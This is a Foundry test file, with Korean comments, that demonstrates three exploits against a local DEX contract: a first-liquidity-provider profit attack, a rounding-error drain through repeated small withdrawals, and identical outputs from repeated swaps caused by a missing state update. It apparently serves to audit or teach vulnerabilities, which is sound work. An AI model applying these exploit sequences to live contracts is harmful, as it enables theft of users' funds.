// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Dex.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract testToken is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
        _mint(msg.sender, 1000000 ether);
    }
}

contract DexTest is Test {
    Dex public dex;
    testToken public tokenX;
    testToken public tokenY;
    address user1 = address(1);
    address user2 = address(2);
    address user3 = address(3);

    function setUp() public {
        tokenX = new testToken("TokenX", "X");
        tokenY = new testToken("TokenY", "Y");
        dex = new Dex(address(tokenX), address(tokenY));

        tokenX.transfer(user1, 10000 ether);
        tokenY.transfer(user1, 10000 ether);
        tokenX.transfer(user2, 10000 ether);
        tokenY.transfer(user2, 10000 ether);
        tokenX.transfer(user3, 10000 ether);
        tokenY.transfer(user3, 10000 ether);
    }

    // user1이 최소한의 초기 유동성 제공합니다.
    // user2가 10,000 ether 크기 tokenX와 tokenY을 추가
    // user1이 자신의 초기 유동성을 제거 => 큰 이익을 얻는지 확인
    
    function test_firstliquidity_exploit() public {
        vm.startPrank(user1);
        tokenX.approve(address(dex), type(uint256).max);
        tokenY.approve(address(dex), type(uint256).max);
        dex.addLiquidity(1 ether, 1 ether, 0);  // Minimal initial liquidity
        vm.stopPrank();

        vm.startPrank(user2);
        tokenX.approve(address(dex), type(uint256).max);
        tokenY.approve(address(dex), type(uint256).max);
        dex.addLiquidity(10000 ether, 10000 ether, 0);
        vm.stopPrank();

        vm.startPrank(user1);
        uint256 initialBalance = tokenX.balanceOf(user1) + tokenY.balanceOf(user1);
        (uint256 rx, uint256 ry) = dex.removeLiquidity(1 ether, 0, 0);
        uint256 finalBalance = tokenX.balanceOf(user1) + tokenY.balanceOf(user1);

        assertTrue(finalBalance - initialBalance > 5000 ether, "First liquidity attack successful");
        
        console.log("Initial liquidity provided: x: 1 ether y :1 ether");
        console.log("Tokens received on removeliquidity: ", (rx + ry) / 1e18, " ether");
        console.log("Profit: ", (finalBalance - initialBalance) / 1e18, " ether");

        vm.stopPrank();
    }

    // user1이 초기 유동성 제공
    // user2가 1 ether의 X와 Y의 유동성 풀에 추가 
    // user2가 0.001 ether 씩 유동성 풀에서 1000번 제거 => 초기 잔액보다 더 증가했는지 확인
    function test_roundingerror_exploit() public {
        vm.startPrank(user1);
        tokenX.approve(address(dex), type(uint256).max);
        tokenY.approve(address(dex), type(uint256).max);
        dex.addLiquidity(10000 ether, 10000 ether, 0);
        vm.stopPrank();

        vm.startPrank(user2);
        tokenX.approve(address(dex), type(uint256).max);
        tokenY.approve(address(dex), type(uint256).max);
        dex.addLiquidity(1 ether, 1 ether, 0);

        uint256 initialBalance = tokenX.balanceOf(user2) + tokenY.balanceOf(user2);
        uint256 totalRemoved = 0;
        
        //0.001 ether씩 제거 =>1000번
        for (uint i = 0; i < 1000; i++) {
            (uint256 rx, uint256 ry) = dex.removeLiquidity(1 * 1e15, 0, 0);
            totalRemoved += rx + ry;
        }
        uint256 finalBalance = tokenX.balanceOf(user2) + tokenY.balanceOf(user2);
        
        //초기 잔액보다 더 증가했는지 확인
        assertTrue(finalBalance - initialBalance > 2 * 1e18, "Rounding error exploit successful");
        
        console.log("Initial balance: ", initialBalance);
        console.log("Final balance: ", finalBalance);
        console.log("gained: ", (finalBalance - initialBalance) / 1e15, " * 1e15");

        vm.stopPrank();
    }

    //상태 업데이트 누락: swap 함수는 swapX나 swapY를 호출한 후 balanceX와 balanceY를 업데이트하지 않음
    // 이로 인해 각 스왑 후 풀의 상태가 변경되지 않아, 연속된 스왑에서 동일한 결과가 발생함
    function test_slippage0_exploit() public {
        uint256 swapAmount = 1000 ether;
        
        //유동성 풀 초기 값 추가
        deal(address(tokenX),address(this),50000 ether);
        deal(address(tokenY),address(this),50000 ether);
        tokenX.approve(address(dex), type(uint256).max);
        tokenY.approve(address(dex), type(uint256).max);

        dex.addLiquidity(50000 ether, 50000 ether, 0);

        vm.startPrank(user2);
        tokenX.approve(address(dex), type(uint256).max);
        uint256 balanceY = tokenY.balanceOf(user2);
        uint256 output = dex.swap(swapAmount, 0, 0);
        uint256 finalBalanceY = tokenY.balanceOf(user2);
        vm.stopPrank();
        
        //swap1
        vm.startPrank(user3);
        tokenX.approve(address(dex), type(uint256).max);
        dex.swap(5000 ether, 0, 0);
        vm.stopPrank();

        //swap2
        vm.startPrank(user2);
        uint256 initialBalanceY2 = tokenY.balanceOf(user2);
        uint256 output2 = dex.swap(swapAmount, 0, 0);
        uint256 finalBalanceY2 = tokenY.balanceOf(user2);
        vm.stopPrank();
        
        console.log("swap1:");
        console.log("output1:", output);
        console.log(" TokenY:", finalBalanceY - balanceY);
        
        console.log("swap2:");
        console.log("output2:", output2);
        console.log(" TokenY:", finalBalanceY2 - initialBalanceY2);
        console.log("Slippage:", (output - output2) * 100 / output, "%");
        
        //상태 업데이트 안해서 발생함..
        assertEq(output,output2);
    }
}